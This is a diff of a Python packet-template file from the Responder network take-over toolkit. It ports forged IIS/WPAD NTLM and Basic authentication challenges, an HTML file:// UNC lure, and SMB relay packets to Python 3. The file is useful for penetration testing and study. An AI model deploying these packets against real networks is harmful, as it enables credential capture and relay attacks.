@@ -1,5 +1,6 @@
 #!/usr/bin/env python
-# This file is part of Responder, a network take-over set of tools 
+# -*- coding: latin-1 -*-
+# This file is part of Responder, a network take-over set of tools
 # created and maintained by Laurent Gaffie.
 # email: laurent.gaffie@gmail.com
 # This program is free software: you can redistribute it and/or modify
@@ -16,24 +17,39 @@
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 import struct
 import os
+import sys
 from odict import OrderedDict
 import datetime
 from base64 import b64decode, b64encode
 
+# Packet class handling all packet generation (see odict.py).
 class Packet():
-    fields = OrderedDict([
-        ("data", ""),
-    ])
-    def __init__(self, **kw):
-        self.fields = OrderedDict(self.__class__.fields)
-        for k,v in kw.items():
-            if callable(v):
-                self.fields[k] = v(self.fields[k])
-            else:
-                self.fields[k] = v
-    def __str__(self):
-        return "".join(map(str, self.fields.values()))
+	fields = OrderedDict([
+		("data", ""),
+	])
+	def __init__(self, **kw):
+		self.fields = OrderedDict(self.__class__.fields)
+		for k,v in kw.items():
+			if callable(v):
+				self.fields[k] = v(self.fields[k])
+			else:
+				self.fields[k] = v
+	def __str__(self):
+		return "".join(map(str, self.fields.values()))
 
+#Python version
+if (sys.version_info > (3, 0)):
+    PY2OR3     = "PY3"
+else:
+    PY2OR3  = "PY2"
+
+def StructWithLenPython2or3(endian,data):
+	#Python2...
+	if PY2OR3 == "PY2":
+		return struct.pack(endian, data)
+	#Python3...
+	else:
+		return struct.pack(endian, data).decode('latin-1')
 
 ##################HTTP Proxy Relay##########################
 def HTTPCurrentDate():
@@ -42,178 +58,176 @@ def HTTPCurrentDate():
 
 #407 section.
 class WPAD_Auth_407_Ans(Packet):
-	fields = OrderedDict([
-		("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
-		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
-		("Type",          "Content-Type: text/html\r\n"),
-		("WWW-Auth",      "Proxy-Authenticate: NTLM\r\n"),
-		("Connection",    "Proxy-Connection: close\r\n"),
-		("Cache-Control",    "Cache-Control: no-cache\r\n"),
-		("Pragma",        "Pragma: no-cache\r\n"),
-		("Proxy-Support", "Proxy-Support: Session-Based-Authentication\r\n"),
-		("Len",           "Content-Length: 0\r\n"),
-		("CRLF",          "\r\n"),
-	])
+    fields = OrderedDict([
+            ("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
+            ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
+            ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
+            ("Type",          "Content-Type: text/html\r\n"),
+            ("WWW-Auth",      "Proxy-Authenticate: NTLM\r\n"),
+            ("Connection",    "Proxy-Connection: close\r\n"),
+            ("Cache-Control",    "Cache-Control: no-cache\r\n"),
+            ("Pragma",        "Pragma: no-cache\r\n"),
+            ("Proxy-Support", "Proxy-Support: Session-Based-Authentication\r\n"),
+            ("Len",           "Content-Length: 0\r\n"),
+            ("CRLF",          "\r\n"),
+    ])
 
 
 class WPAD_NTLM_Challenge_Ans(Packet):
-	fields = OrderedDict([
-		("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
-		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
-		("Type",          "Content-Type: text/html\r\n"),
-		("WWWAuth",       "Proxy-Authenticate: NTLM "),
-		("Payload",       ""),
-		("Payload-CRLF",  "\r\n"),
-		("Len",           "Content-Length: 0\r\n"),
-		("CRLF",          "\r\n"),
-	])
+    fields = OrderedDict([
+            ("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
+            ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
+            ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
+            ("Type",          "Content-Type: text/html\r\n"),
+            ("WWWAuth",       "Proxy-Authenticate: NTLM "),
+            ("Payload",       ""),
+            ("Payload-CRLF",  "\r\n"),
+            ("Len",           "Content-Length: 0\r\n"),
+            ("CRLF",          "\r\n"),
+    ])
 
-	def calculate(self,payload):
-		self.fields["Payload"] = b64encode(payload)
+    def calculate(self,payload):
+        self.fields["Payload"] = b64encode(payload)
 
 #401 section:
 class IIS_Auth_401_Ans(Packet):
-	fields = OrderedDict([
-		("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
-		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
-		("Type",          "Content-Type: text/html\r\n"),
-		("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
-		("Len",           "Content-Length: 0\r\n"),
-		("CRLF",          "\r\n"),
-	])
+    fields = OrderedDict([
+            ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
+            ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
+            ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
+            ("Type",          "Content-Type: text/html\r\n"),
+            ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
+            ("Len",           "Content-Length: 0\r\n"),
+            ("CRLF",          "\r\n"),
+    ])
 
 class IIS_Auth_Granted(Packet):
-	fields = OrderedDict([
-		("Code",          "HTTP/1.1 200 OK\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
-		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
-		("Type",          "Content-Type: text/html\r\n"),
-		("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
-		("ContentLen",    "Content-Length: "),
-		("ActualLen",     "76"),
-		("CRLF",          "\r\n\r\n"),
-		("Payload",       "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\shar\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
-	])
-	def calculate(self):
-		self.fields["ActualLen"] = len(str(self.fields["Payload"]))
+    fields = OrderedDict([
+            ("Code",          "HTTP/1.1 200 OK\r\n"),
+            ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
+            ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
+            ("Type",          "Content-Type: text/html\r\n"),
+            ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
+            ("ContentLen",    "Content-Length: "),
+            ("ActualLen",     "76"),
+            ("CRLF",          "\r\n\r\n"),
+            ("Payload",       "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\shar\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
+    ])
+    def calculate(self):
+        self.fields["ActualLen"] = len(str(self.fields["Payload"]))
 
 class IIS_NTLM_Challenge_Ans(Packet):
-	fields = OrderedDict([
-		("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
-		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
-		("Type",          "Content-Type: text/html\r\n"),
-		("WWWAuth",       "WWW-Authenticate: NTLM "),
-		("Payload",       ""),
-		("Payload-CRLF",  "\r\n"),
-		("Len",           "Content-Length: 0\r\n"),
-		("CRLF",          "\r\n"),
-	])
+    fields = OrderedDict([
+            ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
+            ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
+            ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
+            ("Type",          "Content-Type: text/html\r\n"),
+            ("WWWAuth",       "WWW-Authenticate: NTLM "),
+            ("Payload",       ""),
+            ("Payload-CRLF",  "\r\n"),
+            ("Len",           "Content-Length: 0\r\n"),
+            ("CRLF",          "\r\n"),
+    ])
 
-	def calculate(self,payload):
-		self.fields["Payload"] = b64encode(payload)
+    def calculate(self,payload):
+        self.fields["Payload"] = b64encode(payload)
 
 class IIS_Basic_401_Ans(Packet):
-	fields = OrderedDict([
-		("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
-		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
-		("Type",          "Content-Type: text/html\r\n"),
-		("WWW-Auth",      "WWW-Authenticate: Basic realm=\"Authentication Required\"\r\n"),
-		("AllowOrigin",   "Access-Control-Allow-Origin: *\r\n"),
-		("AllowCreds",    "Access-Control-Allow-Credentials: true\r\n"),
-		("Len",           "Content-Length: 0\r\n"),
-		("CRLF",          "\r\n"),
-	])
+    fields = OrderedDict([
+            ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
+            ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
+            ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
+            ("Type",          "Content-Type: text/html\r\n"),
+            ("WWW-Auth",      "WWW-Authenticate: Basic realm=\"Authentication Required\"\r\n"),
+            ("AllowOrigin",   "Access-Control-Allow-Origin: *\r\n"),
+            ("AllowCreds",    "Access-Control-Allow-Credentials: true\r\n"),
+            ("Len",           "Content-Length: 0\r\n"),
+            ("CRLF",          "\r\n"),
+    ])
 
 ##################WEBDAV Relay Packet#########################
 class WEBDAV_Options_Answer(Packet):
-	fields = OrderedDict([
-		("Code",          "HTTP/1.1 200 OK\r\n"),
-		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
-		("Allow",         "Allow: GET,HEAD,POST,OPTIONS,TRACE\r\n"),
-		("Len",           "Content-Length: 0\r\n"),
-		("Keep-Alive:", "Keep-Alive: timeout=5, max=100\r\n"),
-		("Connection",    "Connection: Keep-Alive\r\n"),
-		("Content-Type",  "Content-Type: text/html\r\n"),
-		("CRLF",          "\r\n"),
-	])
+    fields = OrderedDict([
+            ("Code",          "HTTP/1.1 200 OK\r\n"),
+            ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
+            ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
+            ("Allow",         "Allow: GET,HEAD,POST,OPTIONS,TRACE\r\n"),
+            ("Len",           "Content-Length: 0\r\n"),
+            ("Keep-Alive:", "Keep-Alive: timeout=5, max=100\r\n"),
+            ("Connection",    "Connection: Keep-Alive\r\n"),
+            ("Content-Type",  "Content-Type: text/html\r\n"),
+            ("CRLF",          "\r\n"),
+    ])
 
 ##################SMB Relay Packet############################
 def midcalc(data):  #Set MID SMB Header field.
-    return data[34:36]
+    return data[34:36].decode('latin-1')
 
 def uidcalc(data):  #Set UID SMB Header field.
-    return data[32:34]
+    return data[32:34].decode('latin-1')
 
 def pidcalc(data):  #Set PID SMB Header field.
-    pack=data[30:32]
-    return pack
+    return data[30:32].decode('latin-1')
 
 def tidcalc(data):  #Set TID SMB Header field.
-    pack=data[28:30]
-    return pack
+    return data[28:30].decode('latin-1')
 
 #Response packet.
 class SMBRelayNegoAns(Packet):
-	fields = OrderedDict([
-		("Wordcount",                 "\x11"),
-		("Dialect",                   ""),
-		("Securitymode",              "\x03"),
-		("MaxMpx",                    "\x32\x00"),
-		("MaxVc",                     "\x01\x00"),
-		("MaxBuffSize",               "\x04\x41\x00\x00"),
-		("MaxRawBuff",                "\x00\x00\x01\x00"),
-		("SessionKey",                "\x00\x00\x00\x00"),
-		("Capabilities",              "\xfd\xf3\x01\x80"),
-		("SystemTime",                "\x84\xd6\xfb\xa3\x01\x35\xcd\x01"),
-		("SrvTimeZone",               "\xf0\x00"),
-		("KeyLen",                    "\x00"),
-		("Bcc",                       "\x10\x00"),
-		("Guid",                      os.urandom(16)),
-	])
+    fields = OrderedDict([
+            ("Wordcount",                 "\x11"),
+            ("Dialect",                   ""),
+            ("Securitymode",              "\x03"),
+            ("MaxMpx",                    "\x32\x00"),
+            ("MaxVc",                     "\x01\x00"),
+            ("MaxBuffSize",               "\x04\x41\x00\x00"),
+            ("MaxRawBuff",                "\x00\x00\x01\x00"),
+            ("SessionKey",                "\x00\x00\x00\x00"),
+            ("Capabilities",              "\xfd\xf3\x01\x80"),
+            ("SystemTime",                "\x84\xd6\xfb\xa3\x01\x35\xcd\x01"),
+            ("SrvTimeZone",               "\xf0\x00"),
+            ("KeyLen",                    "\x00"),
+            ("Bcc",                       "\x10\x00"),
+            ("Guid",                      os.urandom(16).decode('latin-1')),
+    ])
 
 ##Response packet.
 class SMBRelayNTLMAnswer(Packet):
-	fields = OrderedDict([
-		("Wordcount",             "\x04"),
-		("AndXCommand",           "\xff"),
-		("Reserved",              "\x00"),
-		("Andxoffset",            "\x5f\x01"),
-		("Action",                "\x00\x00"),
-		("SecBlobLen",            "\xea\x00"),
-		("Bcc",                   "\x34\x01"),
-                ###NTLMPACKET
-		("Data",                  ""),
-                ###NTLMPACKET
+    fields = OrderedDict([
+            ("Wordcount",             "\x04"),
+            ("AndXCommand",           "\xff"),
+            ("Reserved",              "\x00"),
+            ("Andxoffset",            "\x5f\x01"),
+            ("Action",                "\x00\x00"),
+            ("SecBlobLen",            "\xea\x00"),
+            ("Bcc",                   "\x34\x01"),
+            ###NTLMPACKET
+            ("Data",                  ""),
+            ###NTLMPACKET
 
-	])
+    ])
 
 
 #Request packet (no calc):
 class SMBSessionSetupAndxRequest(Packet):
-	fields = OrderedDict([
-		("Wordcount", "\x0c"),
-        	("AndXCommand", "\xff"),
-        	("Reserved","\x00" ),
-       	        ("AndXOffset", "\xec\x00"),              
-        	("MaxBuff","\xff\xff"),
-        	("MaxMPX", "\x32\x00"),
-        	("VCNumber","\x00\x00"),
-        	("SessionKey", "\x00\x00\x00\x00"),
-                ###NTLMPACKET
-		("Data",                  ""),
-                ###NTLMPACKET
-	])
+    fields = OrderedDict([
+            ("Wordcount", "\x0c"),
+            ("AndXCommand", "\xff"),
+            ("Reserved","\x00" ),
+            ("AndXOffset", "\xec\x00"),
+            ("MaxBuff","\xff\xff"),
+            ("MaxMPX", "\x32\x00"),
+            ("VCNumber","\x00\x00"),
+            ("SessionKey", "\x00\x00\x00\x00"),
+            ###NTLMPACKET
+            ("Data",                  ""),
+            ###NTLMPACKET
+    ])
 
 class SMBSessEmpty(Packet):
-	fields = OrderedDict([
-		("Empty",       "\x00\x00\x00"),
-	])
+    fields = OrderedDict([
+            ("Empty",       "\x00\x00\x00"),
+    ])
 ##################SMB Request Packet##########################
 class SMBHeader(Packet):
     fields = OrderedDict([
@@ -237,9 +251,9 @@ class SMBNegoCairo(Packet):
         ("Bcc", "\x62\x00"),
         ("Data", "")
     ])
-    
+
     def calculate(self):
-        self.fields["Bcc"] = struct.pack("<H",len(str(self.fields["Data"])))
+        self.fields["Bcc"] = StructWithLenPython2or3("<H",len(str(self.fields["Data"])))
 
 class SMBNegoCairoData(Packet):
     fields = OrderedDict([
@@ -252,14 +266,14 @@ class SMBSessionSetupAndxNEGO(Packet):
         ("Wordcount", "\x0c"),
         ("AndXCommand", "\xff"),
         ("Reserved","\x00" ),
-        ("AndXOffset", "\xec\x00"),              
+        ("AndXOffset", "\xec\x00"),
         ("MaxBuff","\xff\xff"),
         ("MaxMPX", "\x32\x00"),
         ("VCNumber","\x00\x00"),
         ("SessionKey", "\x00\x00\x00\x00"),
         ("SecBlobLen","\x4a\x00"),
         ("Reserved2","\x00\x00\x00\x00"),
-        ("Capabilities", "\xfc\xe3\x01\x80"), 
+        ("Capabilities", "\xfc\xe3\x01\x80"),
         ("Bcc","\xb1\x00"),
         ##gss api starts here.
         ("ApplicationHeaderTag","\x60"),
@@ -292,10 +306,10 @@ class SMBSessionSetupAndxNEGO(Packet):
         ("NativeLanTerminator","\x00\x00\x00\x00"),
 
     ])
-    def calculate(self): 
+    def calculate(self):
 
-        self.fields["NativeOs"] = self.fields["NativeOs"].encode('utf-16le')
-        self.fields["NativeLan"] = self.fields["NativeLan"].encode('utf-16le')
+        self.fields["NativeOs"] = self.fields["NativeOs"].encode('utf-16le').decode('latin-1')
+        self.fields["NativeLan"] = self.fields["NativeLan"].encode('utf-16le').decode('latin-1')
 
         CompleteSMBPacketLen = str(self.fields["Wordcount"])+str(self.fields["AndXCommand"])+str(self.fields["Reserved"])+str(self.fields["AndXOffset"])+str(self.fields["MaxBuff"])+str(self.fields["MaxMPX"])+str(self.fields["VCNumber"])+str(self.fields["SessionKey"])+str(self.fields["SecBlobLen"])+str(self.fields["Reserved2"])+str(self.fields["Capabilities"])+str(self.fields["Bcc"])+str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLen"])+str(self.fields["AsnSecMechStr"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagStrLen"])+str(self.fields["NegTokenInitSeqHeadTag"])+str(self.fields["NegTokenInitSeqHeadLen"])+str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["Data"])+str(self.fields["NegTokenInitSeqMechMessageVersionTerminator"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanTerminator"])
 
@@ -312,34 +326,34 @@ class SMBSessionSetupAndxNEGO(Packet):
         data6 = str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["Data"])
 
         data10 = str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])
-       
+
         data11 = str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])
 
 
         ## Packet len
-        self.fields["AndXOffset"] = struct.pack("<h", len(CompleteSMBPacketLen)+32)
+        self.fields["AndXOffset"] = StructWithLenPython2or3("<h", len(CompleteSMBPacketLen)+32)
         ##Buff Len
-        self.fields["SecBlobLen"] = struct.pack("<h", len(SecBlobLen))
+        self.fields["SecBlobLen"] = StructWithLenPython2or3("<h", len(SecBlobLen))
         ##Complete Buff Len
-        self.fields["Bcc"] = struct.pack("<h", len(CompleteSMBPacketLen)-27)#session setup struct is 27.
+        self.fields["Bcc"] = StructWithLenPython2or3("<h", len(CompleteSMBPacketLen)-27)#session setup struct is 27.
         ##App Header
-        self.fields["ApplicationHeaderLen"] = struct.pack("<B", len(SecBlobLen)-2)
+        self.fields["ApplicationHeaderLen"] = StructWithLenPython2or3("<B", len(SecBlobLen)-2)
         ##Asn Field 1
-        self.fields["AsnSecMechLen"] = struct.pack("<B", len(str(self.fields["AsnSecMechStr"])))
+        self.fields["AsnSecMechLen"] = StructWithLenPython2or3("<B", len(str(self.fields["AsnSecMechStr"])))
         ##Asn Field 1
-        self.fields["ChoosedTagStrLen"] = struct.pack("<B", len(data3))
+        self.fields["ChoosedTagStrLen"] = StructWithLenPython2or3("<B", len(data3))
         ##SpNegoTokenLen
-        self.fields["NegTokenInitSeqHeadLen"] = struct.pack("<B", len(data4))
+        self.fields["NegTokenInitSeqHeadLen"] = StructWithLenPython2or3("<B", len(data4))
         ##NegoTokenInit
-        self.fields["NegTokenInitSeqHeadLen1"] = struct.pack("<B", len(data10)) 
+        self.fields["NegTokenInitSeqHeadLen1"] = StructWithLenPython2or3("<B", len(data10))
         ## Tag0 Len
-        self.fields["NegTokenInitSeqNLMPLen"] = struct.pack("<B", len(data11))
+        self.fields["NegTokenInitSeqNLMPLen"] = StructWithLenPython2or3("<B", len(data11))
         ## Tag0 Str Len
-        self.fields["NegTokenInitSeqNLMPTag1Len"] = struct.pack("<B", len(str(self.fields["NegTokenInitSeqNLMPTag1Str"])))
+        self.fields["NegTokenInitSeqNLMPTag1Len"] = StructWithLenPython2or3("<B", len(str(self.fields["NegTokenInitSeqNLMPTag1Str"])))
         ## Tag2 Len
-        self.fields["NegTokenInitSeqNLMPTag2Len"] = struct.pack("<B", len(data6))
+        self.fields["NegTokenInitSeqNLMPTag2Len"] = StructWithLenPython2or3("<B", len(data6))
         ## Tag3 Len
-        self.fields["NegTokenInitSeqNLMPTag2OctetLen"] = struct.pack("<B", len(str(self.fields["Data"])))
+        self.fields["NegTokenInitSeqNLMPTag2OctetLen"] = StructWithLenPython2or3("<B", len(str(self.fields["Data"])))
 
 
 class SMBSessionSetupAndxAUTH(Packet):
@@ -355,7 +369,7 @@ class SMBSessionSetupAndxAUTH(Packet):
         ("securitybloblength","\x59\x00"),
         ("reserved2","\x00\x00\x00\x00"),
         ("capabilities", "\xfc\xe3\x01\x80"),
-        ("bcc1","\xbf\x00"), 
+        ("bcc1","\xbf\x00"),
         ("ApplicationHeaderTag","\xa1"),
         ("ApplicationHeaderTagLenOfLen","\x81"),
         ("ApplicationHeaderLen","\xd1"),
@@ -381,59 +395,59 @@ class SMBSessionSetupAndxAUTH(Packet):
         ])
 
 
-    def calculate(self): 
-        self.fields["NativeOs"] = self.fields["NativeOs"].encode('utf-16le')
-        self.fields["NativeLan"] = self.fields["NativeLan"].encode('utf-16le')
+    def calculate(self):
+        self.fields["NativeOs"] = self.fields["NativeOs"].encode('utf-16le').decode('latin-1')
+        self.fields["NativeLan"] = self.fields["NativeLan"].encode('utf-16le').decode('latin-1')
 
         SecurityBlobLen = str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderTagLenOfLen"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLenOfLen"])+str(self.fields["AsnSecMechLen"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagLenOfLen"])+str(self.fields["ChoosedTagLen"])+str(self.fields["ChoosedTag1"])+str(self.fields["ChoosedTag1StrLenOfLen"])+str(self.fields["ChoosedTag1StrLen"])+str(self.fields["Data"])
 
         NTLMData = str(self.fields["Data"])
-	###### ASN Stuff
+        ###### ASN Stuff
         if len(NTLMData) > 255:
-	   self.fields["ApplicationHeaderTagLenOfLen"] = "\x82"
-	   self.fields["ApplicationHeaderLen"] = struct.pack(">H", len(SecurityBlobLen)-0)
+            self.fields["ApplicationHeaderTagLenOfLen"] = "\x82"
+            self.fields["ApplicationHeaderLen"] = StructWithLenPython2or3(">H", len(SecurityBlobLen)-0)
         else:
-           self.fields["ApplicationHeaderTagLenOfLen"] = "\x81"
-	   self.fields["ApplicationHeaderLen"] = struct.pack(">B", len(SecurityBlobLen)-3)
+            self.fields["ApplicationHeaderTagLenOfLen"] = "\x81"
+            self.fields["ApplicationHeaderLen"] = StructWithLenPython2or3(">B", len(SecurityBlobLen)-3)
 
         if len(NTLMData)-8 > 255:
-           self.fields["AsnSecMechLenOfLen"] = "\x82"
-	   self.fields["AsnSecMechLen"] = struct.pack(">H", len(SecurityBlobLen)-4)
+            self.fields["AsnSecMechLenOfLen"] = "\x82"
+            self.fields["AsnSecMechLen"] = StructWithLenPython2or3(">H", len(SecurityBlobLen)-4)
         else:
-           self.fields["AsnSecMechLenOfLen"] = "\x81"
-	   self.fields["AsnSecMechLen"] = struct.pack(">B", len(SecurityBlobLen)-6)
+            self.fields["AsnSecMechLenOfLen"] = "\x81"
+            self.fields["AsnSecMechLen"] = StructWithLenPython2or3(">B", len(SecurityBlobLen)-6)
 
         if len(NTLMData)-12 > 255:
-           self.fields["ChoosedTagLenOfLen"] = "\x82"
-           self.fields["ChoosedTagLen"] = struct.pack(">H", len(SecurityBlobLen)-8) 
+            self.fields["ChoosedTagLenOfLen"] = "\x82"
+            self.fields["ChoosedTagLen"] = StructWithLenPython2or3(">H", len(SecurityBlobLen)-8)
         else:
-           self.fields["ChoosedTagLenOfLen"] = "\x81"
-           self.fields["ChoosedTagLen"] = struct.pack(">B", len(SecurityBlobLen)-9)
+            self.fields["ChoosedTagLenOfLen"] = "\x81"
+            self.fields["ChoosedTagLen"] = StructWithLenPython2or3(">B", len(SecurityBlobLen)-9)
 
         if len(NTLMData)-16 > 255:
-           self.fields["ChoosedTag1StrLenOfLen"] = "\x82"
-           self.fields["ChoosedTag1StrLen"] = struct.pack(">H", len(SecurityBlobLen)-12)
+            self.fields["ChoosedTag1StrLenOfLen"] = "\x82"
+            self.fields["ChoosedTag1StrLen"] = StructWithLenPython2or3(">H", len(SecurityBlobLen)-12)
         else:
-           self.fields["ChoosedTag1StrLenOfLen"] = "\x81"
-           self.fields["ChoosedTag1StrLen"] = struct.pack(">B", len(SecurityBlobLen)-12)
+            self.fields["ChoosedTag1StrLenOfLen"] = "\x81"
+            self.fields["ChoosedTag1StrLen"] = StructWithLenPython2or3(">B", len(SecurityBlobLen)-12)
 
         CompletePacketLen = str(self.fields["wordcount"])+str(self.fields["AndXCommand"])+str(self.fields["reserved"])+str(self.fields["andxoffset"])+str(self.fields["maxbuff"])+str(self.fields["maxmpx"])+str(self.fields["vcnum"])+str(self.fields["sessionkey"])+str(self.fields["securitybloblength"])+str(self.fields["reserved2"])+str(self.fields["capabilities"])+str(self.fields["bcc1"])+str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderTagLenOfLen"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLenOfLen"])+str(self.fields["AsnSecMechLen"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagLenOfLen"])+str(self.fields["ChoosedTagLen"])+str(self.fields["ChoosedTag1"])+str(self.fields["ChoosedTag1StrLenOfLen"])+str(self.fields["ChoosedTag1StrLen"])+str(self.fields["Data"])+str(self.fields["NLMPAuthMsgNull"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["ExtraNull"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanTerminator"])
 
         SecurityBlobLenUpdated = str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderTagLenOfLen"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLenOfLen"])+str(self.fields["AsnSecMechLen"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagLenOfLen"])+str(self.fields["ChoosedTagLen"])+str(self.fields["ChoosedTag1"])+str(self.fields["ChoosedTag1StrLenOfLen"])+str(self.fields["ChoosedTag1StrLen"])+str(self.fields["Data"])
 
         ## Packet len
-        self.fields["andxoffset"] = struct.pack("<h", len(CompletePacketLen)+32) #SMB1 Header is always 32
+        self.fields["andxoffset"] = StructWithLenPython2or3("<h", len(CompletePacketLen)+32) #SMB1 Header is always 32
         ##Buff Len
-        self.fields["securitybloblength"] = struct.pack("<h", len(SecurityBlobLenUpdated))
+        self.fields["securitybloblength"] = StructWithLenPython2or3("<h", len(SecurityBlobLenUpdated))
         ##Complete Buff Len
-        self.fields["bcc1"] = struct.pack("<h", len(CompletePacketLen)-27) #SessionSetup struct is 27.
+        self.fields["bcc1"] = StructWithLenPython2or3("<h", len(CompletePacketLen)-27) #SessionSetup struct is 27.
 
 class SMBTreeConnectData(Packet):
     fields = OrderedDict([
         ("Wordcount", "\x04"),
         ("AndXCommand", "\xff"),
         ("Reserved","\x00" ),
-        ("Andxoffset", "\x5a\x00"), 
+        ("Andxoffset", "\x5a\x00"),
         ("Flags","\x08\x00"),
         ("PasswdLen", "\x01\x00"),
         ("Bcc","\x2f\x00"),
@@ -444,21 +458,21 @@ class SMBTreeConnectData(Packet):
         ("Terminator", "\x00"),
 
     ])
-    def calculate(self): 
+    def calculate(self):
         ##Convert Path to Unicode first before any Len calc.
-        self.fields["Path"] = self.fields["Path"].encode('utf-16le')
+        self.fields["Path"] = self.fields["Path"].encode('utf-16le').decode('latin-1')
 
         ##Passwd Len
-        self.fields["PasswdLen"] = struct.pack("<i", len(str(self.fields["Passwd"])))[:2]
+        self.fields["PasswdLen"] = StructWithLenPython2or3("<i", len(str(self.fields["Passwd"])))[:2]
 
         ##Packet len
         CompletePacket = str(self.fields["Wordcount"])+str(self.fields["AndXCommand"])+str(self.fields["Reserved"])+str(self.fields["Andxoffset"])+str(self.fields["Flags"])+str(self.fields["PasswdLen"])+str(self.fields["Bcc"])+str(self.fields["Passwd"])+str(self.fields["Path"])+str(self.fields["PathTerminator"])+str(self.fields["Service"])+str(self.fields["Terminator"])
 
-        self.fields["Andxoffset"] = struct.pack("<i", len(CompletePacket)+32)[:2]
+        self.fields["Andxoffset"] = StructWithLenPython2or3("<i", len(CompletePacket)+32)[:2]
 
         ##Bcc Buff Len
         BccComplete    = str(self.fields["Passwd"])+str(self.fields["Path"])+str(self.fields["PathTerminator"])+str(self.fields["Service"])+str(self.fields["Terminator"])
-        self.fields["Bcc"] = struct.pack("<i", len(BccComplete))[:2]
+        self.fields["Bcc"] = StructWithLenPython2or3("<i", len(BccComplete))[:2]
 
 class SMBTreeDisconnect(Packet):
     fields = OrderedDict([
@@ -481,7 +495,7 @@ class SMBNTCreateData(Packet):
         ("AllocSize",     "\x00\x00\x00\x00\x00\x00\x00\x00"),
         ("FileAttrib",    "\x00\x00\x00\x00"),
         ("ShareAccess",   "\x03\x00\x00\x00"),
-        ("Disposition",   "\x01\x00\x00\x00"),   
+        ("Disposition",   "\x01\x00\x00\x00"),
         ("CreateOptions", "\x40\x00\x40\x00"),
         ("Impersonation", "\x02\x00\x00\x00"),
         ("SecurityFlags", "\x01"),
